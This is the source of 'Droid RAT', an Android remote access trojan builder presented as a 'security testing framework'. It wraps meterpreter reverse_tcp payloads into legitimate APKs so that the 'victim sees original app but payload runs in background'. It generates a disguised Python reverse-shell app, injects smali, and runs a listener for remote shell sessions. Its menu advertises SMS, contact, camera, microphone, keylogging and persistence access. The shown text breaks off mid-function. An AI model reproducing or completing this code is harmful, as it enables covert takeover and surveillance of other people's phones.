#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
██████╗ ██████╗  ██████╗ ██╗██████╗     ██████║  █████╗ ████████╗
██╔══██╗██╔══██╗██╔═══██╗██║██╔══██╗    ██╔══██╗██╔══██╗╚══██╔══╝
██║  ██║██████╔╝██║   ██║██║██║  ██║    ██████╔╝███████║   ██║   
██║  ██║██╔══██╗██║   ██║██║██║  ██║    ██╔══██╗██╔══██║   ██║   
██████╔╝██║  ██║╚██████╔╝██║██████╔╝    ██║  ██║██║  ██║   ██║   
╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                                                    
██████╗  ██████╗ ███╗   ██╗████████╗    ██████╗ ██████╗ ██╗██████╗ 
██╔══██╗██╔═══██╗████╗  ██║╚══██╔══╝    ╚════██╗██╔══██╗██║╚════██╗
██████╔╝██║   ██║██╔██╗ ██║   ██║        █████╔╝██████╔╝██║ █████╔╝
██╔══██╗██║   ██║██║╚██╗██║   ██║       ██╔═══╝ ██╔══██╗██║██╔═══╝ 
██║  ██║╚██████╔╝██║ ╚████║   ██║       ███████╗██║  ██║██║███████╗
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝       ╚══════╝╚═╝  ╚═╝╚═╝╚══════╝

Droid RAT - Prototype BETA
Cross-platform mobile security testing framework
Developed by Nomi CYBER-X Team
"""

import os
import sys
import time
import json
import base64
import socket
import struct
import subprocess
import threading
import platform
import shutil
import glob
import re
import hashlib
import random
import string
import importlib.util
from datetime import datetime
from pathlib import Path

# ============================================================
# CONFIGURATION
# ============================================================
CONFIG_FILE = "droidrat_config.json"
PAYLOADS_DIR = "payloads"
MODULES_DIR = "modules"
EXPLOITS_DIR = "exploits"
SESSIONS_DIR = "sessions"
BUILDS_DIR = "builds"
LOGS_DIR = "logs"

DEFAULT_CONFIG = {
    "dns": "8.8.8.8",
    "port": 4444,
    "host": "0.0.0.0",
    "encryption": True,
    "encryption_key": "",
    "auto_reconnect": True,
    "keepalive_interval": 30,
    "lhost": "",
    "lport": 4444,
    "usb_auto_detect": True,
    "bluetooth_timeout": 10
}

# Global state
sessions = {}
session_counter = 0
listener_thread = None
listener_running = False
config = {}
connected_devices = {}


# ============================================================
# UTILITY FUNCTIONS
# ============================================================

def banner():
    """Display the Droid RAT banner"""
    os.system('cls' if os.name == 'nt' else 'clear')
    b = """
\033[36m██████╗ ██████╗  ██████╗ ██╗██████╗     ██████╗  █████╗ ████████╗\033[0m
\033[36m██╔══██╗██╔══██╗██╔═══██╗██║██╔══██╗    ██╔══██╗██╔══██╗╚══██╔══╝\033[0m
\033[36m██║  ██║██████╔╝██║   ██║██║██║  ██║    ██████╔╝███████║   ██║   \033[0m
\033[36m██║  ██║██╔══██╗██║   ██║██║██║  ██║    ██╔══██╗██╔══██║   ██║   \033[0m
\033[36m██████╔╝██║  ██║╚██████╔╝██║██████╔╝    ██║  ██║██║  ██║   ██║   \033[0m
\033[36m╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   \033[0m

\033[33m██████╗  ██████╗ ███╗   ██╗████████╗    ██████╗ ██████╗ ██╗██████╗ \033[0m
\033[33m██╔══██╗██╔═══██╗████╗  ██║╚══██╔══╝    ╚════██╗██╔══██╗██║╚════██╗\033[0m
\033[33m██████╔╝██║   ██║██╔██╗ ██║   ██║        █████╔╝██████╔╝██║ █████╔╝\033[0m
\033[33m██╔══██╗██║   ██║██║╚██╗██║   ██║       ██╔═══╝ ██╔══██╗██║██╔═══╝ \033[0m
\033[33m██║  ██║╚██████╔╝██║ ╚████║   ██║       ███████╗██║  ██║██║███████╗\033[0m
\033[33m╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝       ╚══════╝╚═╝  ╚═╝╚═╝╚══════╝\033[0m

\033[35mDroid RAT - Prototype BETA\033[0m
\033[90mCross-platform mobile security testing framework\033[0m
\033[90mDeveloped by Nomi CYBER-X Team\033[0m
\033[90mTools WATSAPP: https://chat.whatsapp.com/IgrsRQheOEJCAPpO3P4cdV\033[0m
\033[31m\033[0m
"""
    print(b)
    print(f"\033[90m{'='*80}\033[0m")
    print(f"\033[32m                             Main Menu\033[0m")
    print(f"\033[90m{'='*80}\033[0m")


def print_menu():
    """Print the main menu options"""
    menu = """
\033[33m[1]\033[0m \033[36mUSB Port Scan\033[0m        \033[90mDetect connected USB devices\033[0m
\033[33m[2]\033[0m \033[36mSessions\033[0m             \033[90mManage active sessions\033[0m
\033[33m[3]\033[0m \033[36mConfiguration\033[0m        \033[90mConfigure DNS, ports, encryption\033[0m
\033[33m[4]\033[0m \033[36mBuild Dropper\033[0m        \033[90mCreate standalone APK\033[0m
\033[33m[5]\033[0m \033[36mRun Payload\033[0m          \033[90mInject payload via USB\033[0m
\033[33m[6]\033[0m \033[36mList Payloads\033[0m        \033[90mView available Payloads\033[0m
\033[33m[7]\033[0m \033[36mList Modules\033[0m         \033[90mView available Modules\033[0m
\033[33m[8]\033[0m \033[36mList Exploits\033[0m        \033[90mView available Exploit\033[0m
\033[33m[9]\033[0m \033[36mBluet-Ducky\033[0m          \033[90mBluetooth HID device attack\033[0m
\033[33m[10]\033[0m \033[36mOTG USB Run\033[0m         \033[90mRun module via OTG\033[0m
\033[31m[Q]\033[0m \033[36mQuit\033[0m                \033[90mExit\033[0m
"""
    print(menu)
    print(f"\033[90m{'='*80}\033[0m")


def init_directories():
    """Create required directories"""
    for d in [PAYLOADS_DIR, MODULES_DIR, EXPLOITS_DIR, SESSIONS_DIR, BUILDS_DIR, LOGS_DIR]:
        Path(d).mkdir(exist_ok=True)


def log(msg, level="INFO"):
    """Log a message with timestamp"""
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{ts}] [{level}] {msg}"
    print(f"\033[90m{log_entry}\033[0m")
    with open(f"{LOGS_DIR}/droidrat.log", "a") as f:
        f.write(log_entry + "\n")


def generate_id():
    """Generate a random session ID"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))


def check_adb():
    """Check if ADB is available"""
    adb_path = shutil.which("adb")
    if adb_path:
        return adb_path
    common_paths = [
        "/usr/bin/adb",
        "/usr/local/bin/adb",
        "/sbin/adb",
        "C:\\Program Files\\Android\\platform-tools\\adb.exe",
        "C:\\Android\\platform-tools\\adb.exe"
    ]
    for p in common_paths:
        if os.path.exists(p):
            return p
    return None


def check_msfvenom():
    """Check if msfvenom is available"""
    return shutil.which("msfvenom") is not None


def check_apktool():
    """Check if apktool is available"""
    return shutil.which("apktool") is not None


def colorize(text, color):
    """Add ANSI color to text"""
    colors = {
        "red": "\033[31m",
        "green": "\033[32m",
        "yellow": "\033[33m",
        "blue": "\033[34m",
        "magenta": "\033[35m",
        "cyan": "\033[36m",
        "white": "\033[37m",
        "reset": "\033[0m",
        "bold": "\033[1m",
        "dim": "\033[2m"
    }
    return f"{colors.get(color, '')}{text}\033[0m"


# ============================================================
# CONFIGURATION MANAGEMENT
# ============================================================

def load_config():
    """Load configuration from file"""
    global config
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
            log("Configuration loaded successfully")
        except Exception as e:
            log(f"Error loading config: {e}", "ERROR")
            config = DEFAULT_CONFIG.copy()
    else:
        config = DEFAULT_CONFIG.copy()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            config["lhost"] = s.getsockname()[0]
            s.close()
        except:
            config["lhost"] = "127.0.0.1"
        save_config()


def save_config():
    """Save configuration to file"""
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
        log("Configuration saved")
    except Exception as e:
        log(f"Error saving config: {e}", "ERROR")


def config_menu():
    """Configuration submenu"""
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(colorize("\n=== Configuration ===", "cyan"))
        print(f"\nCurrent Settings:")
        print(f"  {colorize('[1]', 'yellow')} LHOST (Listener IP): {colorize(config.get('lhost', 'Not set'), 'green')}")
        print(f"  {colorize('[2]', 'yellow')} LPORT (Listener Port): {colorize(str(config.get('lport', 4444)), 'green')}")
        print(f"  {colorize('[3]', 'yellow')} DNS Server: {colorize(config.get('dns', '8.8.8.8'), 'green')}")
        print(f"  {colorize('[4]', 'yellow')} Encryption: {colorize('Enabled' if config.get('encryption') else 'Disabled', 'green')}")
        print(f"  {colorize('[5]', 'yellow')} Auto-Reconnect: {colorize('Enabled' if config.get('auto_reconnect') else 'Disabled', 'green')}")
        print(f"  {colorize('[6]', 'yellow')} USB Auto-Detect: {colorize('Enabled' if config.get('usb_auto_detect') else 'Disabled', 'green')}")
        print(f"  {colorize('[7]', 'yellow')} Generate Encryption Key")
        print(f"  {colorize('[B]', 'red')} Back to Main Menu")
        
        choice = input(f"\n{colorize('Select option: ', 'cyan')}").strip()
        
        if choice == '1':
            new_host = input("Enter LHOST IP: ").strip()
            if new_host:
                config["lhost"] = new_host
                save_config()
        elif choice == '2':
            try:
                new_port = int(input("Enter LPORT: ").strip())
                config["lport"] = new_port
                save_config()
            except:
                print(colorize("Invalid port number!", "red"))
                time.sleep(1)
        elif choice == '3':
            new_dns = input("Enter DNS server: ").strip()
            if new_dns:
                config["dns"] = new_dns
                save_config()
        elif choice == '4':
            config["encryption"] = not config.get("encryption", True)
            save_config()
        elif choice == '5':
            config["auto_reconnect"] = not config.get("auto_reconnect", True)
            save_config()
        elif choice == '6':
            config["usb_auto_detect"] = not config.get("usb_auto_detect", True)
            save_config()
        elif choice == '7':
            key = base64.urlsafe_b64encode(os.urandom(32)).decode()
            config["encryption_key"] = key
            save_config()
            print(colorize(f"\n[+] New Encryption Key: {key}", "green"))
            input("\nPress Enter to continue...")
        elif choice.lower() == 'b':
            break
        else:
            print(colorize("Invalid option!", "red"))
            time.sleep(1)


# ============================================================
# USB PORT SCAN
# ============================================================

def usb_port_scan():
    """Scan for connected USB devices"""
    print(colorize("\n=== USB Port Scan ===", "cyan"))
    print(colorize("[*] Scanning for connected USB devices...\n", "yellow"))
    
    devices_found = []
    
    # Method 1: Check via lsusb (Linux)
    if platform.system() == "Linux":
        try:
            result = subprocess.run(["lsusb"], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                for line in lines:
                    if line.strip():
                        devices_found.append(("USB", line.strip()))
                        print(f"  {colorize('[USB]', 'green')} {line.strip()}")
        except:
            pass
    
    # Method 2: Check via system_profiler (macOS)
    elif platform.system() == "Darwin":
        try:
            result = subprocess.run(["system_profiler", "SPUSBDataType"], capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if 'Product:' in line or 'Manufacturer:' in line:
                        devices_found.append(("USB", line.strip()))
                        print(f"  {colorize('[USB]', 'green')} {line.strip()}")
        except:
            pass
    
    # Method 3: Check via wmic (Windows)
    elif platform.system() == "Windows":
        try:
            result = subprocess.run(["wmic", "path", "Win32_USBControllerDevice", "get", "Description"], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if line.strip() and 'Description' not in line:
                        devices_found.append(("USB", line.strip()))
                        print(f"  {colorize('[USB]', 'green')} {line.strip()}")
        except:
            pass
    
    # Method 4: Check ADB devices
    adb = check_adb()
    if adb:
        try:
            result = subprocess.run([adb, "devices"], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                for line in lines[1:]:
                    if line.strip() and '\t' in line:
                        dev_id, status = line.split('\t')
                        devices_found.append(("ADB", dev_id))
                        print(f"  {colorize('[ADB]', 'blue')} Device: {dev_id} ({status})")
                        try:
                            info = subprocess.run([adb, "-s", dev_id, "shell", "getprop", "ro.product.model"], 
                                                capture_output=True, text=True, timeout=3)
                            if info.returncode == 0 and info.stdout.strip():
                                print(f"          Model: {colorize(info.stdout.strip(), 'green')}")
                        except:
                            pass
        except:
            pass
    
    # Method 5: Check /dev/ and /sys/class/ for USB devices
    if platform.system() == "Linux":
        try:
            for f in sorted(glob.glob("/dev/ttyUSB*") + glob.glob("/dev/ttyACM*")):
                devices_found.append(("SERIAL", f))
                print(f"  {colorize('[SERIAL]', 'magenta')} {f}")
        except:
            pass
    
    if not devices_found:
        print(colorize("  [!] No USB devices detected.", "red"))
    
    print(f"\n{colorize(f'[+] Total devices found: {len(devices_found)}', 'green')}")
    input(f"\n{colorize('Press Enter to continue...', 'dim')}")


# ============================================================
# SESSION MANAGEMENT
# ============================================================

class Session:
    """Represents an active device session"""
    def __init__(self, session_id, device_id, device_info, conn=None, addr=None):
        self.session_id = session_id
        self.device_id = device_id
        self.device_info = device_info
        self.conn = conn
        self.addr = addr
        self.created = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.last_active = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.alive = True
        self.platform = ""
        self.os_version = ""
        
    def to_dict(self):
        return {
            "session_id": self.session_id,
            "device_id": self.device_id,
            "device_info": self.device_info,
            "addr": str(self.addr) if self.addr else "",
            "created": self.created,
            "last_active": self.last_active,
            "alive": self.alive,
            "platform": self.platform,
            "os_version": self.os_version
        }


def session_menu():
    """Manage active sessions"""
    global sessions, session_counter
    
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(colorize("\n=== Session Management ===", "cyan"))
        print(f"\n{colorize('Active Sessions:', 'yellow')}")
        print(f"{'='*60}")
        
        if not sessions:
            print(f"\n  {colorize('[!] No active sessions.', 'red')}")
            print(f"  {colorize('[*] Start a listener first, then deploy a payload.', 'dim')}")
        else:
            print(f"\n  {'ID':<8} {'Device':<20} {'Status':<10} {'Created':<20}")
            print(f"  {'-'*58}")
            for sid, session in sessions.items():
                status = colorize("\u25c9 Alive", "green") if session.alive else colorize("\u25cb Dead", "red")
                dinfo = session.device_info[:18] if len(session.device_info) > 18 else session.device_info
                print(f"  {colorize(sid, 'cyan'):<8} {dinfo:<20} {status:<10} {session.created:<20}")
        
        print(f"\n{colorize('[S]', 'yellow')} Start Listener")
        print(f"{colorize('[K]', 'yellow')} Stop Listener")
        print(f"{colorize('[I]', 'yellow')} Interact with Session")
        print(f"{colorize('[L]', 'yellow')} List Sessions (detailed)")
        print(f"{colorize('[R]', 'yellow')} Remove Dead Sessions")
        print(f"{colorize('[B]', 'red')} Back to Main Menu")
        
        choice = input(f"\n{colorize('Select option: ', 'cyan')}").strip().lower()
        
        if choice == 's':
            start_listener()
        elif choice == 'k':
            stop_listener()
        elif choice == 'i':
            if not sessions:
                print(colorize("[!] No sessions available.", "red"))
                time.sleep(1)
                continue
            sid = input("Enter session ID: ").strip()
            if sid in sessions and sessions[sid].alive:
                interact_session(sid)
            else:
                print(colorize(f"[!] Session {sid} not found or dead.", "red"))
                time.sleep(1)
        elif choice == 'l':
            if sessions:
                for sid, session in sessions.items():
                    print(colorize(f"\n[Session {sid}]", "cyan"))
                    for k, v in session.to_dict().items():
                        print(f"  {k}: {v}")
            else:
                print(colorize("[!] No sessions.", "red"))
            input("\nPress Enter to continue...")
        elif choice == 'r':
            to_remove = [sid for sid, s in sessions.items() if not s.alive]
            for sid in to_remove:
                try:
                    if sessions[sid].conn:
                        sessions[sid].conn.close()
                except:
                    pass
                del sessions[sid]
            print(colorize(f"[+] Removed {len(to_remove)} dead session(s).", "green"))
            time.sleep(1)
        elif choice == 'b':
            return
        else:
            print(colorize("Invalid option!", "red"))
            time.sleep(1)


def start_listener():
    """Start a reverse shell listener"""
    global listener_thread, listener_running, sessions, session_counter
    
    if listener_running:
        print(colorize("[!] Listener is already running.", "yellow"))
        time.sleep(1)
        return
    
    host = config.get("lhost", "0.0.0.0")
    port = config.get("lport", 4444)
    
    print(colorize(f"\n[*] Starting listener on {host}:{port}...", "yellow"))
    
    def listener_worker():
        global listener_running, session_counter
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((host, port))
            server.listen(5)
            server.settimeout(1.0)
            
            log(f"Listener started on {host}:{port}")
            print(colorize(f"[+] Listener established on {host}:{port}", "green"))
            
            while listener_running:
                try:
                    conn, addr = server.accept()
                    log(f"Incoming connection from {addr[0]}:{addr[1]}")
                    
                    session_counter += 1
                    sid = generate_id()
                    
                    try:
                        conn.settimeout(5)
                        handshake = conn.recv(4096).decode(errors='replace')
                        device_info = handshake.strip() if handshake else f"Device_{addr[0]}"
                    except:
                        device_info = f"Device_{addr[0]}"
                    
                    session = Session(sid, addr[0], device_info, conn, addr)
                    
                    try:
                        conn.settimeout(3)
                        conn.send(b"SYSTEM_INFO\n")
                        response = b""
                        while True:
                            try:
                                chunk = conn.recv(4096)
                                if not chunk:
                                    break
                                response += chunk
                            except:
                                break
                        if response:
                            session.platform = response.decode(errors='replace')[:100]
                    except:
                        pass
                    
                    sessions[sid] = session
                    print(colorize(f"\n[+] New session established: {sid}", "green"))
                    print(colorize(f"    Device: {device_info}", "green"))
                    print(colorize(f"    Address: {addr[0]}:{addr[1]}", "green"))
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if listener_running:
                        log(f"Listener error: {e}", "ERROR")
            
            server.close()
            log("Listener stopped")
            
        except Exception as e:
            log(f"Failed to start listener: {e}", "ERROR")
            print(colorize(f"[!] Error: {e}", "red"))
            listener_running = False
    
    listener_running = True
    listener_thread = threading.Thread(target=listener_worker, daemon=True)
    listener_thread.start()
    time.sleep(0.5)
    input(f"\n{colorize('Listener started! Press Enter to return to session menu...', 'dim')}")


def stop_listener():
    """Stop the listener"""
    global listener_running
    if listener_running:
        listener_running = False
        print(colorize("[*] Stopping listener...", "yellow"))
        time.sleep(0.5)
        print(colorize("[+] Listener stopped.", "green"))
    else:
        print(colorize("[!] No listener running.", "yellow"))
    time.sleep(1)


def interact_session(sid):
    """Interact with an active session"""
    session = sessions.get(sid)
    if not session or not session.alive:
        print(colorize("[!] Session not available.", "red"))
        time.sleep(1)
        return
    
    print(colorize(f"\n[+] Interacting with session {sid}", "green"))
    print(colorize(f"    Device: {session.device_info}", "green"))
    print(colorize(f"    Type 'help' for commands, 'back' to return\n", "dim"))
    
    # Try to keep connection alive
    conn = session.conn
    conn.settimeout(None)
    
    while True:
        try:
            cmd = input(colorize(f"DroidRAT[{sid}]> ", "cyan")).strip()
        except (EOFError, KeyboardInterrupt):
            break
        
        if not cmd:
            continue
        
        if cmd.lower() == 'back':
            break
        
        elif cmd.lower() == 'help':
            print(colorize("""
Commands:
  shell <cmd>       Execute shell command
  info              Get device information
  screenshot        Capture screenshot (Android)
  camera            Capture photo from camera
  mic               Record audio from microphone
  sms              List SMS messages
  contacts          List contacts
  location          Get GPS location
  keylog            Start/stop keylogger
  upload <local> <remote>   Upload file
  download <remote> <local> Download file
  persist           Install persistence
  exit              Close the session
  back              Return to session menu
""", "yellow"))
        
        elif cmd.lower() == 'info':
            try:
                conn.send(b"INFO\n")
                time.sleep(0.5)
                conn.settimeout(3)
                data = conn.recv(8192).decode(errors='replace')
                print(colorize(f"[Device Info]\n{data}", "green"))
            except Exception as e:
                print(colorize(f"[!] Error: {e}", "red"))
        
        elif cmd.lower().startswith('shell '):
            scmd = cmd[6:]
            try:
                conn.send(f"CMD:{scmd}\n".encode())
                time.sleep(0.3)
                conn.settimeout(5)
                response = b""
                while True:
                    try:
                        chunk = conn.recv(4096)
                        if not chunk:
                            break
                        response += chunk
                        if len(chunk) < 4096:
                            break
                    except:
                        break
                print(response.decode(errors='replace'))
            except Exception as e:
                print(colorize(f"[!] Error: {e}", "red"))
        
        elif cmd.lower() == 'exit':
            try:
                conn.send(b"EXIT\n")
                conn.close()
            except:
                pass
            session.alive = False
            print(colorize("[*] Session closed.", "yellow"))
            break
        
        else:
            # Try as shell command
            try:
                conn.send(f"CMD:{cmd}\n".encode())
                time.sleep(0.3)
                conn.settimeout(5)
                response = b""
                while True:
                    try:
                        chunk = conn.recv(4096)
                        if not chunk:
                            break
                        response += chunk
                        if len(chunk) < 4096:
                            break
                    except:
                        break
                print(response.decode(errors='replace'))
            except Exception as e:
                print(colorize(f"[!] Error: {e}", "red"))


# ============================================================
# BUILD DROPPER (APK Builder)
# ============================================================

def build_dropper():
    """Build a real APK with Python payload embedded"""
    print(colorize("\n=== APK Bundler - Payload in App ===", "cyan"))
    print(colorize("[*] Bundle Python reverse shell payload inside an APK\n", "yellow"))
    
    lhost = config.get("lhost", "127.0.0.1")
    lport = config.get("lport", 4444)
    
    print(f"  LHOST: {colorize(lhost, 'green')}")
    print(f"  LPORT: {colorize(str(lport), 'green')}")
    
    print(f"\n{colorize('Methods:', 'yellow')}")
    print(f"  {colorize('[1]', 'yellow')} msfvenom -x template (Bind into legitimate APK)")
    print(f"  {colorize('[2]', 'yellow')} Create standalone APK (Kivy/Buildozer)")
    print(f"  {colorize('[3]', 'yellow')} Create lightweight APK (Manual Smali injection)")
    print(f"  {colorize('[4]', 'yellow')} Create APK with Termux + Python bundle")
    print(f"  {colorize('[B]', 'red')} Back")
    
    choice = input(f"\n{colorize('Select method: ', 'cyan')}").strip()
    
    if choice == '1':
        build_msfvenom_template(lhost, lport)
    elif choice == '2':
        build_kivy_apk(lhost, lport)
    elif choice == '3':
        build_smali_apk(lhost, lport)
    elif choice == '4':
        build_termux_apk(lhost, lport)


def build_msfvenom_template(lhost, lport):
    """Bind payload into a legitimate APK using msfvenom -x"""
    print(colorize("\n[*] Method 1: msfvenom -x template (Bind into legitimate APK)", "cyan"))
    
    if not check_msfvenom():
        print(colorize("[!] msfvenom not found. Install Metasploit.", "red"))
        input("Press Enter to continue...")
        return
    
    # Ask for template APK
    print(colorize("\n[*] Select a legitimate APK to use as template:", "yellow"))
    print(colorize("    The payload will be injected and original app will still work.", "dim"))
    
    template = input("Path to original APK (or press Enter to skip): ").strip()
    
    if template and os.path.exists(template):
        app_name = input("Output APK name: ").strip() or "ModdedApp"
        output = f"{BUILDS_DIR}/{app_name}.apk"
        
        print(colorize(f"\n[*] Injecting payload into {os.path.basename(template)}...", "yellow"))
        print(colorize(f"    This keeps the original app functionality!", "green"))
        
        cmd = [
            "msfvenom", "-x", template,
            "-p", "android/meterpreter/reverse_tcp",
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-o", output
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            if os.path.exists(output):
                size = os.path.getsize(output)
                md5 = hashlib.md5(open(output,'rb').read()).hexdigest()
                print(colorize(f"\n[+] Backdoored APK created!", "green"))
                print(colorize(f"    Path: {output}", "green"))
                print(colorize(f"    Size: {size/1024:.1f} KB", "green"))
                print(colorize(f"    MD5: {md5}", "dim"))
                print(colorize(f"\n[!] IMPORTANT: App will still work normally!", "yellow"))
                print(colorize(f"    Victim sees original app but payload runs in background.", "yellow"))
            else:
                print(colorize(f"\n[!] Failed. Error: {result.stderr}", "red"))
        except Exception as e:
            print(colorize(f"\n[!] Error: {e}", "red"))
    else:
        # No template APK - create from scratch
        print(colorize("\n[*] No template provided. Creating standalone meterpreter APK...", "yellow"))
        
        output = f"{BUILDS_DIR}/DroidRAT_Payload.apk"
        cmd = [
            "msfvenom",
            "-p", "android/meterpreter/reverse_tcp",
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-o", output
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            if os.path.exists(output):
                size = os.path.getsize(output)
                print(colorize(f"\n[+] APK created!", "green"))
                print(colorize(f"    Path: {output}", "green"))
                print(colorize(f"    Size: {size/1024:.1f} KB", "green"))
            else:
                print(colorize(f"\n[!] Failed.", "red"))
                print(result.stderr)
        except Exception as e:
            print(colorize(f"\n[!] Error: {e}", "red"))
    
    print(colorize(f"\n[*] Start listener on target machine:", "yellow"))
    print(colorize(f"    msfconsole -q -x 'use multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit'", "dim"))
    
    input(f"\n{colorize('Press Enter to continue...', 'dim')}")


def build_kivy_apk(lhost, lport):
    """Create APK using Kivy/Buildozer with embedded Python payload"""
    print(colorize("\n[*] Method 2: Kivy/Buildozer APK with Python payload", "cyan"))
    
    # Create main.py with reverse shell
    main_py = f'''"""
DroidRAT - Security Testing Tool
This app demonstrates mobile security testing concepts.
"""

import socket
import subprocess
import os
import sys
import threading
import time
import base64

LHOST = "{lhost}"
LPORT = {lport}

class ReverseShell:
    def __init__(self):
        self.running = True
        self.thread = threading.Thread(target=self.connect, daemon=True)
        self.thread.start()
    
    def connect(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((LHOST, LPORT))
                s.send(b"[+] DroidRAT device connected\\n")
                
                while self.running:
                    try:
                        data = s.recv(4096)
                        if not data:
                            break
                        cmd = data.decode().strip()
                        if cmd == "EXIT":
                            break
                        elif cmd.startswith("CMD:"):
                            output = subprocess.getoutput(cmd[4:])
                            s.send(output.encode() if output else b"Done\\n")
                        else:
                            output = subprocess.getoutput(cmd)
                            s.send(output.encode() if output else b"Done\\n")
                    except:
                        break
                s.close()
            except:
                pass
            time.sleep(5)

# Using Kivy for GUI if available, otherwise run headless
try:
    from kivy.app import App
    from kivy.uix.label import Label
    from kivy.uix.button import Button
    from kivy.uix.boxlayout import BoxLayout
    
    class DroidRATApp(App):
        def build(self):
            layout = BoxLayout(orientation='vertical')
            label = Label(text="DroidRAT Security Tool\\nRunning in background...")
            layout.add_widget(label)
            return layout
    
    if __name__ == "__main__":
        shell = ReverseShell()
        DroidRATApp().run()
except ImportError:
    # No Kivy - run headless
    shell = ReverseShell()
    while True:
        time.sleep(60)
'''
    
    # Write files
    apk_dir = f"{BUILDS_DIR}/kivy_app"
    Path(apk_dir).mkdir(exist_ok=True)
    
    with open(f"{apk_dir}/main.py", "w") as f:
        f.write(main_py)
    
    # Create buildozer.spec
    spec = f'''[app]
title = DroidRAT
package.name = DroidRAT
package.domain = com.security.test
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0
requirements = python3,kivy
orientation = portrait
osx.package_name = DroidRAT
fullscreen = 0
        
[buildozer]
log_level = 2
warn_on_root = 1
'''
    with open(f"{apk_dir}/buildozer.spec", "w") as f:
        f.write(spec)
    
    print(colorize(f"\n[+] Kivy app created in: {apk_dir}", "green"))
    print(colorize(f"    main.py - Python reverse shell with optional Kivy GUI", "green"))
    print(colorize(f"    buildozer.spec - Build configuration", "green"))
    
    if shutil.which("buildozer"):
        print(colorize("\n[*] Buildozer found! Building APK...", "yellow"))
        print(colorize("    This may take 5-15 minutes on first run.", "yellow"))
        yn = input("Start build now? (y/N): ").strip().lower()
        if yn == 'y':
            try:
                current = os.getcwd()
                os.chdir(apk_dir)
                result = subprocess.run(["buildozer", "android", "debug"], 
                                      capture_output=True, text=True, timeout=900)
                os.chdir(current)
                apk_path = f"{apk_dir}/bin/*.apk"
                apks = glob.glob(apk_path)
                if apks:
                    print(colorize(f"\n[+] APK built: {apks[0]}", "green"))
                else:
                    print(colorize(f"\n[!] Build output: {result.stdout[-500:]}", "yellow"))
            except Exception as e:
                print(colorize(f"\n[!] Build error: {e}", "red"))
                os.chdir(current)
    else:
        print(colorize(f"\n[!] Buildozer not installed.", "yellow"))
        print(colorize(f"    Install: pip install buildozer", "yellow"))
        print(colorize(f"    Then: cd {apk_dir} && buildozer android debug", "yellow"))
        print(colorize(f"\n[+] Or use the pre-built APK from method 1 (msfvenom)", "green"))
    
    # Create the "app icon" placeholder
    print(colorize(f"\n[+] For quick deployment without buildozer:", "green"))
    print(colorize(f"    Use option [1] msfvenom to create a ready APK now.", "green"))
    
    input(f"\n{colorize('Press Enter to continue...', 'dim')}")


def build_smali_apk(lhost, lport):
    """Manual Smali injection into any APK"""
    print(colorize("\n[*] Method 3: Manual Smali Injection", "cyan"))
    print(colorize("[*] Injects payload into any legitimate APK\n", "yellow"))
    
    if not check_apktool():
        print(colorize("[!] apktool not found.", "red"))
        print(colorize("    Install: sudo apt install apktool", "yellow"))
        input("Press Enter to continue...")
        return
    
    # Check for jarsigner
    jarsigner = shutil.which("jarsigner") or shutil.which("apksigner")
    if not jarsigner:
        print(colorize("[!] jarsigner/apksigner not found.", "red"))
        print(colorize("    Install: sudo apt install apksigner", "yellow"))
        input("Press Enter to continue...")
        return
    
    template = input("Path to legitimate APK to inject: ").strip()
    if not template or not os.path.exists(template):
        print(colorize("[!] APK not found.", "red"))
        input("Press Enter to continue...")
        return
    
    app_name = input("Output APK name: ").strip() or "InjectedApp"
    output = f"{BUILDS_DIR}/{app_name}.apk"
    
    print(colorize(f"\n[*] Step 1: Decompiling original APK...", "yellow"))
    work_dir = f"{BUILDS_DIR}/smali_work"
    if os.path.exists(work_dir):
        shutil.rmtree(work_dir)
    
    try:
        subprocess.run(["apktool", "d", "-f", "-o", work_dir, template], 
                      capture_output=True, text=True, timeout=30)
        print(colorize("    [OK] Decompiled.", "green"))
    except Exception as e:
        print(colorize(f"    [FAIL] {e}", "red"))
        input("Press Enter to continue...")
        return
    
    print(colorize(f"\n[*] Step 2: Generating meterpreter payload...", "yellow"))
    payload_dir = f"{BUILDS_DIR}/payload_smali"
    if os.path.exists(payload_dir):
        shutil.rmtree(payload_dir)
    
    try:
        # Generate a simple payload APK for smali files
        subprocess.run(["msfvenom", "-p", "android/meterpreter/reverse_tcp",
                       f"LHOST={lhost}", f"LPORT={lport}",
                       "-o", f"{BUILDS_DIR}/temp_payload.apk"],
                      capture_output=True, text=True, timeout=60)
        
